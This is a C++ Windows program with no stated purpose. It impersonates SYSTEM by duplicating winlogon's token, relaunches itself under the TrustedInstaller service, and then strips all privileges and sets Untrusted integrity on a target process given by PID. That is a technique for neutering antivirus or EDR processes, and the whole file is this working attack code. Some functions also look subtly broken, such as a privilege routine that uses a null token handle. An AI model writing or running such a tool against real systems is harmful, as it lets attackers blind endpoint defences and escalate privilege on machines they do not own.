#include <Windows.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include <sddl.h>
#include <TlHelp32.h>
#include <vector>

uintptr_t ModifyLabel
(
    HANDLE token,
    TOKEN_INFORMATION_CLASS tokenInformationClass,
    TOKEN_MANDATORY_LABEL* tokenMandatoryLabel,
    DWORD labelLenght
) {
    uintptr_t res;
    DWORD err;
    res = SetTokenInformation(token, tokenInformationClass, tokenMandatoryLabel, labelLenght);
    if (res == 0) {
        err = GetLastError();
        std::cout << "modifyLabel error: " << err << std::endl;
    }
    return res;
}

BOOL EnablePriv(const std::wstring& privilege)
{
    HANDLE tokenHandle = NULL;
    LUID lUID;
    if (!LookupPrivilegeValue(nullptr, privilege.c_str(), &lUID)) {
        CloseHandle(tokenHandle);
        return FALSE;
    }

    TOKEN_PRIVILEGES tokenPrivileges;
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = lUID;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
        CloseHandle(tokenHandle);
        return FALSE;
    }

    CloseHandle(tokenHandle);
    return TRUE;
}

DWORD FetchProcessPID(const std::wstring& process)
{
    HANDLE hSnapshot;
    if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
        return -1;
        
    DWORD pid = -1;
    PROCESSENTRY32 pe;
    ZeroMemory(&pe, sizeof(PROCESSENTRY32));
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe))
    {
        while (Process32Next(hSnapshot, &pe))
        {
            if (pe.szExeFile == process)
            {
                pid = pe.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(hSnapshot);
    return pid;
}

BOOL Impersonate()
{
    const auto systemPID = FetchProcessPID(L"winlogon.exe");
    HANDLE hProcess;
    if ((hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, systemPID)) == nullptr)
        return FALSE;

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken))
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hDupToken;
    SECURITY_ATTRIBUTES tokenAttr;
    tokenAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    tokenAttr.lpSecurityDescriptor = nullptr;
    tokenAttr.bInheritHandle = FALSE;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &tokenAttr, SecurityImpersonation, TokenImpersonation, &hDupToken))
    {
        CloseHandle(hToken);
        return FALSE;
    }

    ImpersonateLoggedOnUser(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    CloseHandle(hDupToken);
    return TRUE;
}

/// <returns>PID of service process</returns>
int InitializeService()
{
    SC_HANDLE hManager;
    if ((hManager = OpenSCManager(nullptr, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) == nullptr)
        return -1;

    SC_HANDLE hService;
    if ((hService = OpenServiceW(hManager, L"TrustedInstaller", SERVICE_QUERY_STATUS | SERVICE_START)) == nullptr)
    {
        CloseServiceHandle(hManager);
        return -1;
    }

    SERVICE_STATUS_PROCESS status_buffer;
    DWORD bytes_needed;
    while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&status_buffer), sizeof(SERVICE_STATUS_PROCESS), &bytes_needed))
    {
        if (status_buffer.dwCurrentState == SERVICE_STOPPED)
        {
            if (!StartServiceW(hService, 0, nullptr))
            {
                CloseServiceHandle(hService);
                return -1;
            }
        }
        if (status_buffer.dwCurrentState == SERVICE_START_PENDING || status_buffer.dwCurrentState == SERVICE_STOP_PENDING)
        {
            Sleep(status_buffer.dwWaitHint);
            continue;
        }
        if (status_buffer.dwCurrentState == SERVICE_RUNNING)
        {
            CloseServiceHandle(hService);
            return status_buffer.dwProcessId;
        }
    }

    CloseServiceHandle(hManager);
    CloseServiceHandle(hService);
}

void ElevateAsSystem(const DWORD pid, const std::wstring& procName)
{
    EnablePriv(SE_DEBUG_NAME);
    EnablePriv(SE_IMPERSONATE_NAME);
    Impersonate();

    HANDLE hProcess;
    hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    HANDLE hToken;
    OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken);

    HANDLE hDupToken;
    SECURITY_ATTRIBUTES token_attributes;
    token_attributes.nLength = sizeof(SECURITY_ATTRIBUTES);
    token_attributes.lpSecurityDescriptor = nullptr;
    token_attributes.bInheritHandle = FALSE;
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &token_attributes, SecurityImpersonation, TokenImpersonation, &hDupToken);

    STARTUPINFOW si;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    GetStartupInfoW(&si);

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

    CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, nullptr, 
        const_cast<LPWSTR>(std::wstring(procName.begin(), procName.end()).c_str()), CREATE_UNICODE_ENVIRONMENT, nullptr, nullptr, &si, &pi);

    CloseHandle(hProcess);
    CloseHandle(hToken);
    CloseHandle(hDupToken);
}

int Elevate(int pid) {
    wchar_t buffer[MAX_PATH];
    GetModuleFileNameW(NULL, buffer, MAX_PATH);
    std::wstring exePath(buffer);
    exePath += L" " + std::to_wstring(pid);
    const auto processPID = InitializeService();
    ElevateAsSystem(processPID, exePath);
    return 2;
}

int GetPrivileges() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        CloseHandle(hToken);
        return 4;
    }

    TOKEN_ELEVATION_TYPE elevationType;
    DWORD dwSize;
    if (!GetTokenInformation(hToken, TokenElevationType, &elevationType, sizeof(elevationType), &dwSize)) {
        CloseHandle(hToken);
        return 4;
    }

    int result = 4;
    switch (elevationType) {
    case TokenElevationTypeLimited:
        result = 0;
        break;
    case TokenElevationTypeFull:
        result = 1;
        break;
    case TokenElevationTypeDefault:
        result = 2;
        break;
    }

    // Clean up
    CloseHandle(hToken);
    return result;
}

int main(int argc, char* argv[]) {
    if (argc < 2)
        return 0;

    int pid = std::stoi(argv[1]);
    if (GetPrivileges() != 2) {
        Elevate(pid);
    }

    DWORD processPID = static_cast<DWORD>(pid);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processPID);
    if (hProcess == nullptr) {
        std::cout << "Process handle is null" << std::endl;
        return 1;
    }

    HANDLE processToken;
    if (!OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &processToken)) {
        std::cout << "Could not open process token " << std::endl;
        return 1;
    }

    DWORD tokenInfoSize = 0;
    GetTokenInformation(processToken, TokenPrivileges, nullptr, 0, &tokenInfoSize);
    if (tokenInfoSize == 0) {
        std::cout << "Could not fetch token info" << std::endl;
        return 1;
    }
    std::cout << "Token Size: " << tokenInfoSize << std::endl;

    std::vector<BYTE> tokenInformation(tokenInfoSize);
    if (!GetTokenInformation(processToken, TokenPrivileges, &tokenInformation[0], tokenInfoSize, &tokenInfoSize)) {
        std::cout << "Could not fetch Token info" << std::endl;
        return 1;
    }

    DWORD privilegeCount;
    memcpy(&privilegeCount, &tokenInformation[0], sizeof(DWORD));
    std::cout << "Privilege Count: " << privilegeCount << std::endl;

    for (DWORD i = 0; i < privilegeCount; i++) {
        LUID tempLuid;
        DWORD attributes;
        memcpy(&tempLuid, &tokenInformation[sizeof(DWORD) + i * (sizeof(LUID) + sizeof(DWORD))], sizeof(LUID));
        memcpy(&attributes, &tokenInformation[sizeof(DWORD) + i * (sizeof(LUID) + sizeof(DWORD)) + sizeof(LUID)], sizeof(DWORD));

        TOKEN_PRIVILEGES newTokenPrivs;
        newTokenPrivs.PrivilegeCount = 1;
        newTokenPrivs.Privileges[0].Luid = tempLuid;
        newTokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

        if (!AdjustTokenPrivileges(processToken, FALSE, &newTokenPrivs, 0, nullptr, nullptr)) {
            DWORD err = GetLastError();
            std::cout << "Could not adjust token privileges: " << err << std::endl;
            return 1;
        }
    }

    PSID sid;
    ConvertStringSidToSidW(L"S-1-16-0", &sid);
    TOKEN_MANDATORY_LABEL tml;
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    tml.Label.Sid = sid;

    try {
        uintptr_t result = ModifyLabel(processToken, TokenIntegrityLevel, &tml, sizeof(tml));
        if (result == 0) {
            std::cout << "Failed to modify label" << result << std::endl;
            return 1;
        }
    }
    catch (const std::exception& e) {
        std::cout << "Exception Thrown: " << e.what() << std::endl;
        return 1;
    }

    std::cout << "Process privileges succesfully adjusted." << std::endl;
    return 0;
}